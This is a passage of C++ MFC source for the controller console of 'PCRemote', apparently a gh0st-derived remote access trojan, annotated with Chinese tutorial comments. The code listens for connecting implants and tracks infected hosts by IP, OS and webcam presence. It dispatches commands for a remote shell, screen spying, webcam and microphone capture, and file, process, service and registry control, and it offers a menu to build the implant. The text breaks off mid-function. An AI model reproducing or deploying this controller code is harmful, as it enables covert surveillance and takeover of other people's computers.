
// PCRemoteDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "PCRemote.h"
#include "PCRemoteDlg.h"
#include "afxdialogex.h"
#include "SettingDlg.h"
#include "..\..\common\macros.h"
#include "ShellDlg.h"
#include "SystemDlg.h"
#include "ScreenSpyDlg.h"
#include "FileManagerDlg.h"
#include "AudioDlg.h"
#include "VideoDlg.h"
#include "BuildDlg.h"
#include "serverdlg.h"
#include "RegDlg.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#endif

typedef struct
{
	char	*title;           //列表的名称
	int		nWidth;   //列表的宽度
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Online_Data[] = 
{
	{"IP",				148	},
	{"区域",			150	},
	{"计算机名/备注",	160	},
	{"操作系统",		128	},
	{"CPU",				80	},
	{"摄像头",			81	},
	{"PING",			81	}
};
int g_Column_Online_Count=7;  //列表的个数
int g_Column_Online_Width=0;  //列总宽度
COLUMNSTRUCT g_Column_Message_Data[] = 
{
	{"信息类型",		68	},
	{"时间",			100	},
	{"信息内容",	    660	}
};
//变量声明
int g_Column_Message_Count=3; //列表的个数
int g_Column_Message_Width=0;  //列总宽度

CIOCPServer *m_iocpServer = NULL;
CPCRemoteDlg *g_pPCRemoteDlg=NULL;
// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CPCRemoteDlg 对话框




CPCRemoteDlg::CPCRemoteDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CPCRemoteDlg::IDD, pParent)
{

	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	iCount=0;
	g_pPCRemoteDlg=this;
	if (((CPCRemoteApp *)AfxGetApp())->m_bIsQQwryExist)
	{
		m_QQwry = new SEU_QQwry;
		m_QQwry->SetPath("QQWry.Dat");
	}
}

void CPCRemoteDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
	DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
}

BEGIN_MESSAGE_MAP(CPCRemoteDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CPCRemoteDlg::OnNMRClickOnline)
//ON_COMMAND(IDM_ONLINE_AUDIO, &CPCRemoteDlg::OnOnlineAudio)
//ON_COMMAND(IDM_ONLINE_DELETE, &CPCRemoteDlg::OnOnlineDelete)
ON_COMMAND(IDM_ONLINE_AUDIO, &CPCRemoteDlg::OnOnlineAudio)
ON_COMMAND(IDM_ONLINE_CMD, &CPCRemoteDlg::OnOnlineCmd)
ON_COMMAND(IDM_ONLINE_DESKTOP, &CPCRemoteDlg::OnOnlineDesktop)
ON_COMMAND(IDM_ONLINE_FILE, &CPCRemoteDlg::OnOnlineFile)
ON_COMMAND(IDM_ONLINE_PROCESS, &CPCRemoteDlg::OnOnlineProcess)
ON_COMMAND(IDM_ONLINE_SERVER, &CPCRemoteDlg::OnOnlineServer)
ON_COMMAND(IDM_ONLINE_VIDEO, &CPCRemoteDlg::OnOnlineVideo)
ON_COMMAND(IDM_ONLINE_WINDOW, &CPCRemoteDlg::OnOnlineWindow)
ON_COMMAND(IDM_ONLINE_DELETE, &CPCRemoteDlg::OnOnlineDelete)
ON_COMMAND(IDM_MAIN_CLOSE, &CPCRemoteDlg::OnMainClose)
ON_COMMAND(IDM_MAIN_ABOUT, &CPCRemoteDlg::OnMainAbout)
ON_COMMAND(IDM_MAIN_BUILD, &CPCRemoteDlg::OnMainBuild)
ON_COMMAND(IDM_MAIN_SET, &CPCRemoteDlg::OnMainSet)
//自定义消息
 ON_MESSAGE(UM_ICONNOTIFY, (LRESULT (__thiscall CWnd::* )(WPARAM,LPARAM))OnIconNotify)
 ON_MESSAGE(WM_ADDTOLIST, OnAddToList)        //跟进  OnAddToList
 ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog) 
 ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog) 
ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog) 
ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
ON_MESSAGE(WM_OPENSERVERDIALOG, OnOpenServerDialog)
 ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegEditDialog)
//ON_WM_CLOSE()
//ON_COMMAND(IDM_NOTIFY_CLOSE, &CPCRemoteDlg::OnNotifyClose)
//ON_COMMAND(IDM_NOTIFY_SHOW, &CPCRemoteDlg::OnNotifyShow)
ON_COMMAND(IDM_NOTIFY_CLOSE, &CPCRemoteDlg::OnNotifyClose)
ON_COMMAND(IDM_NOTIFY_SHOW, &CPCRemoteDlg::OnNotifyShow)
ON_WM_CLOSE()
ON_COMMAND(IDM_ONLINE_REGEDIT, &CPCRemoteDlg::OnOnlineRegedit)
END_MESSAGE_MAP()



//lang2.1_9  NotifyProc是这个socket内核的核心  所有的关于socket 的处理都要调用这个函数
void CALLBACK CPCRemoteDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	
	try
	{

		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			//g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			//ProcessReceive(pContext);        //这里是有数据到来 但没有完全接收
			break;
		case NC_RECEIVE_COMPLETE:        //--这里就是处理发送来的数据了在gh0st中找到这个函数
			ProcessReceiveComplete(pContext);       //这里时完全接收 处理发送来的数据 跟进    ProcessReceiveComplete
			break;
		}
	}catch(...){}
}

void CPCRemoteDlg::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str;
	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;

	}
	m_iocpServer = new CIOCPServer;

	////lang2.1_8
	// 开启IPCP服务器 最大连接  端口     查看NotifyProc回调函数  函数定义
	if (m_iocpServer->Initialize(NotifyProc, NULL, 100000, nPort))
	{

		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
		{ 
			for ( int i=0; ; i++ )
			{ 
				str += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if ( host->h_addr_list[i] + host->h_length >= host->h_name )
					break;
				str += "/";
			}
		}

		//m_wndStatusBar.SetPaneText(0, str);
		//str.Format("端口: %d", nPort);
		//m_wndStatusBar.SetPaneText(2, str);
		str.Format("监听端口: %d成功", nPort);
		ShowMessage(true,str);
	}
	else
	{
		//str.Format("端口%d绑定失败", nPort);
		//m_wndStatusBar.SetPaneText(0, str);
		//m_wndStatusBar.SetPaneText(2, "端口: 0");
		str.Format("监听端口: %d失败", nPort);
		ShowMessage(false,str);
	}

	//m_wndStatusBar.SetPaneText(3, "连接: 0");
}

//lang2.1_10   //处理所有服务端发送来的消息
void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];      //这里就是ClientContext 结构体的int m_Dialog[2];

	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)                //这里查看是否给他赋值了，如果赋值了就把数据传给功能窗口处理
	{
		switch (pContext->m_Dialog[0])
		{
		/*
		
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;*/
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CVideoDlg *)dlg)->OnReceiveComplete();
			break;
		case SERVER_DLG:
			((CServerDlg *)dlg)->OnReceiveComplete();
			break;
		case REGEDIT_DLG:
			((CRegDlg *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])   //如果没有赋值就判断是否是上线包和打开功能功能窗口
	{                                                           //讲解后回到ClientContext结构体
	/*case TOKEN_AUTH: // 要求验证
		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	case TOKEN_HEARTBEAT: // 回复心跳包
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

		break;*/
	case TOKEN_LOGIN: // 上线包

		{
			//这里处理上线
			if (m_iocpServer->m_nMaxConnections <= g_pPCRemoteDlg->m_CList_Online.GetItemCount())
			{
				closesocket(pContext->m_Socket);
			}
			else
			{
				pContext->m_bIsMainSocket = true;
				g_pPCRemoteDlg->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);   
			}
			// 激活
			BYTE	bToken = COMMAND_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

		break;
	/*
	case TOKEN_BITMAPINFO: //
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	
	
	case TOKEN_KEYBOARD_START:
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;*/
	case TOKEN_AUDIO_START: // 语音
		g_pPCRemoteDlg->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_DRIVE_LIST: // 驱动器列表
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
		g_pPCRemoteDlg->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
		g_pPCRemoteDlg->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WSLIST:    //意思就是进程管理，窗口管理都弹出一个对话框
	case TOKEN_PSLIST:
		g_pPCRemoteDlg->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START:
		g_pPCRemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		g_pPCRemoteDlg->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case  TOKEN_SERVERLIST:
		g_pPCRemoteDlg->PostMessage(WM_OPENSERVERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_REGEDIT:
		g_pPCRemoteDlg->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
		break;
		// 命令停止当前操作
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}

void CPCRemoteDlg::ListenPort(void)
{
	int	nPort = ((CPCRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort");         //读取ini 文件中的监听端口
	int	nMaxConnection = ((CPCRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection");   //读取最大连接数
	if (nPort == 0)
		nPort = 80;
	if (nMaxConnection == 0)
		nMaxConnection = 10000;
	Activate(nPort,nMaxConnection);             //开始监听
}

// CPCRemoteDlg 消息处理程序
BOOL CPCRemoteDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	HMENU hmenu;
	hmenu=LoadMenu(NULL,MAKEINTRESOURCE(IDR_MENU_MAIN));  //载入菜单资源
	::SetMenu(this->GetSafeHwnd(),hmenu);                  //为窗口设置菜单
	::DrawMenuBar(this->GetSafeHwnd());                    //显示菜单
	InitList();  //init all  list
	CreatStatusBar();                            //创建状态栏
	CreateToolBar();

	nid.cbSize = sizeof(nid);     //大小赋值
	nid.hWnd = m_hWnd;           //父窗口
	nid.uID = IDR_MAINFRAME;     //icon  ID
	nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;   //托盘所拥有的状态
	nid.uCallbackMessage = UM_ICONNOTIFY;            //回调消息
	nid.hIcon = m_hIcon;                            //icon 变量
	CString str="PCRemote远程协助软件.........";       //气泡提示
	lstrcpyn(nid.szTip, (LPCSTR)str, sizeof(nid.szTip) / sizeof(nid.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &nid);   //显示托盘

	ShowMessage(true,"软件初始化成功...");
	CRect rect;
	GetWindowRect(&rect);
	rect.bottom+=20;
	MoveWindow(rect);
	ListenPort();        //开始监听
	//Test();
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CPCRemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CPCRemoteDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
	
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CPCRemoteDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CPCRemoteDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);
	double dcx=cx;     //对话框的总宽度
	if (SIZE_MINIMIZED==nType)
	{
		return;
	}
	if (m_CList_Online.m_hWnd!=NULL)
	{
		CRect rc;
		rc.left=1;         //列表的左坐标
		rc.top=80;         //列表的上坐标
		rc.right=cx-1;     //列表的右坐标
		rc.bottom=cy-160;  //列表的下坐标
		m_CList_Online.MoveWindow(rc);
		for(int i=0;i<g_Column_Online_Count;i++){                   //遍历每一个列
			double dd=g_Column_Online_Data[i].nWidth;     //得到当前列的宽度
			dd/=g_Column_Online_Width;                    //看一看当前宽度占总长度的几分之几
			dd*=dcx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth=dd;                                   //转换为int 类型
			m_CList_Online.SetColumnWidth(i,(lenth));        //设置当前的宽度
		}

	}
	if (m_CList_Message.m_hWnd!=NULL)
	{
		CRect rc;
		rc.left=1;        //列表的左坐标
		rc.top=cy-156;    //列表的上坐标
		rc.right=cx-1;    //列表的右坐标
		rc.bottom=cy-20;  //列表的下坐标
		m_CList_Message.MoveWindow(rc);

		for(int i=0;i<g_Column_Message_Count;i++){                   //遍历每一个列
			double dd=g_Column_Message_Data[i].nWidth;     //得到当前列的宽度
			dd/=g_Column_Message_Width;                    //看一看当前宽度占总长度的几分之几
			dd*=dcx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth=dd;                                   //转换为int 类型
			m_CList_Message.SetColumnWidth(i,(lenth));        //设置当前的宽度
		}
	}

	if(m_wndStatusBar.m_hWnd!=NULL){    //当对话框大小改变时 状态条大小也随之改变
		CRect rc;
		rc.top=cy-20;
		rc.left=0;
		rc.right=cx;
		rc.bottom=cy;
		m_wndStatusBar.MoveWindow(rc);
		m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0),SBPS_POPOUT, cx-10);
	}

	if(m_ToolBar.m_hWnd!=NULL)              //工具条
	{
		CRect rc;
		rc.top=rc.left=0;
		rc.right=cx;
		rc.bottom=80;
		m_ToolBar.MoveWindow(rc);     //设置工具条大小位置
	}
	// TODO: 在此处添加消息处理程序代码
}


// init list
int CPCRemoteDlg::InitList(void)
{
	// init online list
	m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	for (int i = 0; i < g_Column_Online_Count; i++)
	{
		m_CList_Online.InsertColumn(i, g_Column_Online_Data[i].title,LVCFMT_CENTER,g_Column_Online_Data[i].nWidth);
		g_Column_Online_Width+=g_Column_Online_Data[i].nWidth;       //得到总宽度

	}
	m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	for (int i = 0; i < g_Column_Message_Count; i++)
	{
		m_CList_Message.InsertColumn(i, g_Column_Message_Data[i].title,LVCFMT_CENTER,g_Column_Message_Data[i].nWidth);
		g_Column_Message_Width+=g_Column_Message_Data[i].nWidth;       //得到总宽度
	}
	return 0;
}


// add to online list
void CPCRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing,ClientContext	*pContext)
{
	m_CList_Online.InsertItem(0,strIP);           //默认为0行  这样所有插入的新列都在最上面
	m_CList_Online.SetItemText(0,ONLINELIST_ADDR,strAddr);      //设置列的显示字符   这里 ONLINELIST_ADDR等 为第二节课中的枚举类型 用这样的方法
	m_CList_Online.SetItemText(0,ONLINELIST_COMPUTER_NAME,strPCName); //解决问题会避免以后扩展时的冲突
	m_CList_Online.SetItemText(0,ONLINELIST_OS,strOS); 
	m_CList_Online.SetItemText(0,ONLINELIST_CPU,strCPU);
	m_CList_Online.SetItemText(0,ONLINELIST_VIDEO,strVideo);
	m_CList_Online.SetItemText(0,ONLINELIST_PING,strPing); 
	m_CList_Online.SetItemData(0,(DWORD)pContext);
	ShowMessage(true,strIP+"主机上线");
}


// Show msg to  msg list
void CPCRemoteDlg::ShowMessage(bool bIsOK, CString strMsg)
{
	CString strIsOK,strTime;
	CTime t=CTime::GetCurrentTime();
	strTime=t.Format("%H:%M:%S");
	if (bIsOK)
	{
		strIsOK="执行成功";
	}else{
		strIsOK="执行失败";
	}
	m_CList_Message.InsertItem(0,strIsOK);
	m_CList_Message.SetItemText(0,1,strTime);
	m_CList_Message.SetItemText(0,2,strMsg);


	CString strStatusMsg;
	if (strMsg.Find("上线")>0)         //处理上线还是下线消息
	{
		iCount++;
	}else if (strMsg.Find("下线")>0)
	{
		iCount--;
	}else if (strMsg.Find("断开")>0)
	{
		iCount--;
	}
	iCount=(iCount<=0?0:iCount);         //防止iCount 有-1的情况
	strStatusMsg.Format("连接:%d",iCount);
	m_wndStatusBar.SetPaneText(0,strStatusMsg);   //在状态条上显示文字
}


void CPCRemoteDlg::Test(void)
{
	//AddList("192.168.0.1","本机局域网","Lang","Windows7","2.2GHZ","有","123232");
	//AddList("192.168.0.2","本机局域网","Lang","Windows7","2.2GHZ","有","123232");
	//AddList("192.168.0.3","本机局域网","Lang","Windows7","2.2GHZ","有","123232");
	
}

void CPCRemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu	popup;
	popup.LoadMenu(IDR_MENU_ONLINE);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount();
	if (m_CList_Online.GetSelectedCount() == 0)       //如果没有选中
	{ 
		for (int i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //菜单全部变灰
		}

	}
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;
}



void CPCRemoteDlg::OnOnlineAudio()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_AUDIO;                 //向服务端发送命令 服务端中搜索
	SendSelectCommand(&bToken, sizeof(BYTE));	

}

LRESULT CPCRemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

void CPCRemoteDlg::OnOnlineCmd()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("终端管理");
	BYTE	bToken = COMMAND_SHELL;              //lang4.2.1        向服务端发送一个COMMAND_SHELL命令  到svchost中搜之
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

//lang4.2打开终端管理窗口
LRESULT CPCRemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	//这里定义远程终端的对话框，转到远程终端的CShellDlg类的定义  先查看对话框界面后转到OnInitDialog
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}
void CPCRemoteDlg::OnOnlineDesktop()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_SCREEN_SPY;  //向服务端发送COMMAND_SCREEN_SPY CKernelManager::OnReceive搜之
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CPCRemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;

	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

void CPCRemoteDlg::OnOnlineFile()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("文件管理");
	BYTE	bToken = COMMAND_LIST_DRIVE;            //在服务端中搜索COMMAND_LIST_DRIVE
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CPCRemoteDlg::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext *pContext = (ClientContext *)lParam;

	//转到CFileManagerDlg  构造函数
	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}

void CPCRemoteDlg::OnOnlineProcess()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("进程管理");
	BYTE	bToken = COMMAND_SYSTEM;         //赋值一个宏 然后发送到服务端，到服务端搜索COMMAND_SYSTEM
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CPCRemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);  //动态创建CSystemDlg

	// 设置父窗口为卓面
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());      //创建对话框
	dlg->ShowWindow(SW_SHOW);                      //显示对话框

	pContext->m_Dialog[0] = SYSTEM_DLG;              //这个值用做服务端再次发送数据时的标识
	pContext->m_Dialog[1] = (int)dlg;
	//先看一下这个对话框的界面再看这个对话框类的构造函数
	return 0;
}
void CPCRemoteDlg::OnOnlineServer()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("服务管理");
	BYTE	bToken = COMMAND_SERVICES;         //赋值一个宏 然后发送到服务端，到服务端搜索COMMAND_SYSTEM
	SendSelectCommand(&bToken, sizeof(BYTE));
	
}

LRESULT CPCRemoteDlg::OnOpenServerDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CServerDlg	*dlg = new CServerDlg(this, m_iocpServer, pContext);  //动态创建CSystemDlg

	// 设置父窗口为卓面
	dlg->Create(IDD_SERVERDLG, GetDesktopWindow());      //创建对话框
	dlg->ShowWindow(SW_SHOW);                      //显示对话框

	pContext->m_Dialog[0] = SERVER_DLG;              //这个值用做服务端再次发送数据时的标识
	pContext->m_Dialog[1] = (int)dlg;
	//先看一下这个对话框的界面再看这个对话框类的构造函数
	return 0;
}

void CPCRemoteDlg::OnOnlineVideo()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("视频管理");
	BYTE	bToken = COMMAND_WEBCAM;                 //向服务端发送命令 服务端中搜索
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

LRESULT CPCRemoteDlg::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{


	ClientContext *pContext = (ClientContext *)lParam;
	CVideoDlg	*dlg = new CVideoDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_VIDEO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


void CPCRemoteDlg::OnOnlineWindow()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("窗口管理");
	BYTE	bToken = COMMAND_WSLIST;         
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CPCRemoteDlg::OnOnlineDelete()
{
	// TODO: 在此添加命令处理程序代码
	CString strIP;
	int iSelect=m_CList_Online.GetSelectionMark( );
	strIP=m_CList_Online.GetItemText(iSelect,ONLINELIST_IP);
	m_CList_Online.DeleteItem(iSelect);
	strIP+=" 主机断开连接";
	ShowMessage(true,strIP);
}


void CPCRemoteDlg::OnMainClose()
{
	// TODO: 在此添加命令处理程序代码
	 PostMessage(WM_CLOSE);
}


void CPCRemoteDlg::OnMainAbout()
{
	// TODO: 在此添加命令处理程序代码
	CAboutDlg dlgAbout;
	dlgAbout.DoModal();
}


void CPCRemoteDlg::OnMainBuild()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("生成服务端");
	CBuildDlg buildDlg;
	buildDlg.DoModal();
}


void CPCRemoteDlg::OnMainSet()
{
	// TODO: 在此添加命令处理程序代码
	CSettingDlg SettingDlg;
	SettingDlg.DoModal();
}

static UINT indicators[] =
{
	IDR_STATUSBAR_STRING
};


// create  status bar
void CPCRemoteDlg::CreatStatusBar(void)
{
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))                    //创建状态条并设置字符资源的ID
	{
		TRACE0("Failed to create status bar\n");
		return ;      // fail to create
	}
	CRect rc;
	::GetWindowRect(m_wndStatusBar.m_hWnd,rc);             
	m_wndStatusBar.MoveWindow(rc);                   
}

void CPCRemoteDlg::CreateToolBar(void)
{
	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))
	{
		TRACE0("Failed to create toolbar\n");
		return;      // fail to create
	}
	m_ToolBar.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
	m_ToolBar.LoadTrueColorToolBar
		(
		48,    //加载真彩工具条
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
